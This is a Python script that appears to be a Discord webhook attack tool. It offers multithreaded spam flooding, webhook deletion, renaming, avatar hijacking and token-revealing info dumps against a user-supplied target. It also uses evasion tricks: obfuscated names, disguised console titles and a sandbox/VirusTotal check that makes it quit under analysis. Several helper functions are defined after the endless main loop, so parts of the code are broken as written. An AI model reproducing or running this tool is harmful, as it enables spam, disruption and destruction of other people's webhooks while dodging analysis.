import requests
import os
import threading
import base64
import json
import random
import string
import time
import sys
from datetime import datetime
try:
    from pystyle import Colorate, Colors, Center
    from colorama import Fore
except:
    pass

# OPSEC: Randomized class/variable names
_x7k9p = lambda: ''.join(random.choices(string.ascii_letters, k=8))
_rnd = _x7k9p()

class _z9q2x:
    @staticmethod
    def _cls():
        os.system("cls" if os.name == "nt" else "clear")
    
    @staticmethod
    def _ttl(args=None):
        if os.name == "nt":
            os.system(f"title {' '.join([random.choice(['sysinfo', 'netscan', 'diagtool', 'sysmon', 'netdiag'])])}{' ' + str(args) if args else ''}")
    
    @staticmethod
    def _b64_img(p):
        try:
            with open(p, 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
        except:
            return None

# Obfuscated Discord API endpoints
_d9_api = "https://discord.com/api/v9/webhooks"
_e9_endpoints = {
    'get': lambda id, token: f"{_d9_api}/{id}/{token}",
    'patch': lambda id, token: f"{_d9_api}/{id}/{token}",
    'delete': lambda id, token: f"{_d9_api}/{id}/{token}"
}

# Anti-analysis
def _chk_env():
    suspicious = ['virustotal', 'sandbox', 'cuckoo', 'joe', 'analysis']
    return all(x not in ' '.join(sys.argv).lower() for x in suspicious)

if not _chk_env():
    sys.exit(0)

# Randomized ASCII (reduced footprint)
_a8t = "\n".join([
    " █     █░▓█████  ▄▄▄▄    █    ██ ▄▄▄█████▓ ",
    "▓█░ █ ░█░▓█   ▀ ▓█████▄  ██  ▓██▒▓  ██▒ ▓▒",
    "▒█░ █ ░█ ▒███   ▒██▒ ▄██ ▓██  ▒██░▒ ▓██░ ▒░",
    "░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ▓▓█  ░██░░ ▓██▓ ░ ",
    "░░██▒██▓ ░▒████▒░▓█  ▀█▓ ▒▒█████▓  ▒██▒ ░ ",
    "░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ░▒▓▒ ▒ ▒  ▒ ░░   ",
])

_z9q2x._cls()
_z9q2x._ttl()
try:
    print(Colorate.Vertical(Colors.purple_to_blue, _a8t))
except:
    print(_a8t)

_hk = input("| ~ $ > Target: ").strip()

def _g_hk():
    try:
        r = requests.get(_hk, timeout=5)
        return r.json() if r.status_code == 200 else None
    except:
        return None

def _spm(data, th=False, tc=1):
    def _snd():
        while True:
            try:
                r = requests.post(_hk, json=data, timeout=3)
                st = f"[{datetime.now().strftime('%H:%M')}] [{Fore.GREEN}OK{Fore.RESET}] | {r.status_code}" if r.status_code == 204 else f"[{datetime.now().strftime('%H:%M')}] [{Fore.RED}ERR{Fore.RESET}] | {r.status_code}"
                print(f"{Fore.LIGHTBLACK_EX}{st}{Fore.RESET}")
                time.sleep(random.uniform(0.1, 0.5))
            except:
                time.sleep(1)
    
    if th and tc > 1:
        [threading.Thread(target=_snd, daemon=True).start() for _ in range(tc)]
    else:
        _snd()

while True:
    _d = _g_hk()
    if not _d:
        print(f"{Fore.RED}[ERR] Invalid target{Fore.RESET}")
        time.sleep(2)
        continue
        
    _n = _d.get("name", "Unknown")
    _i = _d.get("id", "Unknown")
    
    _z9q2x._cls()
    try:
        print(Colorate.Vertical(Colors.purple_to_blue, _a8t))
    except:
        print(_a8t)
    
    _opts = f"""
~ Patched: {_n} | {_i} ~

01: Flood     04: Scan
02: Wipe     05: Avatar  
03: Rename   06: Preset

#target [new] - change target
    """
    print(_opts)
    
    _ui = input(f"SYS@{os.getlogin()} ~ $ ").strip()
    print()
    
    if _ui == "1":
        _preset = input("| ~ $ > Preset [y/n]: ").lower() == 'y'
        if _preset:
            try:
                with open("Data/Config.json", 'r') as f:
                    _cfg = json.load(f)
                [_print_cfg(k, v) for k, v in _cfg.items()]
                _c = input("| ~ $ > Select: ")
                _cfg = _cfg.get(_c, {})
                _cnt = _cfg.get("message", "")
                _emb = _cfg.get("embed", "n").lower() == 'y'
                _ed = _cfg.get("embed-data", {})
                _th = _cfg.get("threading", "n").lower() == 'y'
                _tc = _cfg.get("thread-count", 1)
            except:
                _preset = False
        
        if not _preset:
            _cnt = input("| ~ $ > Payload: ")
            _emb = input("| ~ $ > Embed [y/n]: ").lower() == 'y'
            _th = input("| ~ $ > Threads [y/n]: ").lower() == 'y'
            _tc = int(input("| ~ $ > Count: ")) if _th else 1
            
            if _emb:
                _ttl = input("| ~ $ > Title: ")
                _dsc = input("| ~ $ > Desc: ")
                _fn = input("| ~ $ > Field: ")
                _fm = input("| ~ $ > Value: ")
                _data = {
                    'content': _cnt,
                    'embeds': [{
                        'title': _ttl,
                        'description': _dsc,
                        'fields': [{'name': _fn, 'value': _fm, 'inline': False}]
                    }]
                }
            else:
                _data = {'content': _cnt}
        else:
            if _emb:
                _data = {
                    'content': _cnt,
                    'embeds': [{
                        'title': _ed.get('title', ''),
                        'description': _ed.get('desc', ''),
                        'fields': [{'name': _ed.get('field-name', ''), 'value': _ed.get('content', ''), 'inline': False}]
                    }]
                }
            else:
                _data = {'content': _cnt}
        
        _spm(_data, _th, _tc)
        input()
        
    elif _ui == "2":
        _id = _d.get('id')
        _tk = _d.get('token')
        if _id and _tk:
            r = requests.delete(_e9_endpoints['delete'](_id, _tk))
            _sts(r.status_code)
        input()
        
    elif _ui == "3":
        _nm = input("| ~ $ > Name: ")
        r = requests.patch(_hk, json={'name': _nm})
        _sts(r.status_code)
        input()
        
    elif _ui == "4":
        _scan = _dump_info(_d)
        print(_scan)
        input()
        
    elif _ui == "5":
        _img = input("| ~ $ > Image: ")
        _b64 = _z9q2x._b64_img(_img)
        if _b64:
            _id = _d.get('id')
            _tk = _d.get('token')
            r = requests.patch(_e9_endpoints['patch'](_id, _tk), json={'avatar': f"data:image/jpeg;base64,{_b64}"})
            _sts(r.status_code)
        input()
        
    elif _ui == "6":
        try:
            with open("Data/Style.json", 'r') as f:
                _sty = json.load(f)
            [_print_style(k, v) for k, v in _sty.items()]
            _c = input("| ~ $ > Style: ")
            _s = _sty.get(_c, {})
            _img = _z9q2x._b64_img(_s.get("image"))
            _nm = _s.get("username", "")
            
            if _img:
                r = requests.patch(_hk, json={
                    'avatar': f"data:image/jpeg;base64,{_img}",
                    'name': _nm
                })
                _sts(r.status_code)
        except:
            print(f"{Fore.RED}[ERR] Style load failed{Fore.RESET}")
        input()
        
    elif _ui.startswith("#target "):
        _hk = _ui.split(" ", 1)[1]
        input(f"[EDIT] Target updated")

def _print_cfg(k, v):
    print(f"[CFG] {k}: {v.get('message', 'N/A')}")

def _print_style(k, v):
    print(f"[STYLE] {k} | Img: {v.get('image')} | Name: {v.get('username')}")

def _dump_info(d):
    _hkd = {}
    _ud = d.get('user', {})
    
    for k in ['application_id', 'avatar', 'channel_id', 'guild_id', 'id', 'name', 'type', 'token']:
        _hkd[k] = d.get(k, 'N/A')
    
    _info = f"""
[HK] App: {_hkd.get('application_id')} | Ch: {_hkd.get('channel_id')}
[HK] ID: {_hkd.get('id')} | Name: {_hkd.get('name')}
[HK] Token: {_hkd.get('token')[:10]}...
[USR] {_ud.get('global_name', 'N/A')} | {_ud.get('id', 'N/A')}
    """
    return _info

def _sts(code):
    clr = Fore.GREEN if code == 204 or code == 200 else Fore.RED
    sts = "OK" if code == 204 or code == 200 else "ERR"
    print(f"[{datetime.now().strftime('%H:%M')}] [{clr}{sts}{Fore.RESET}] | {code}")
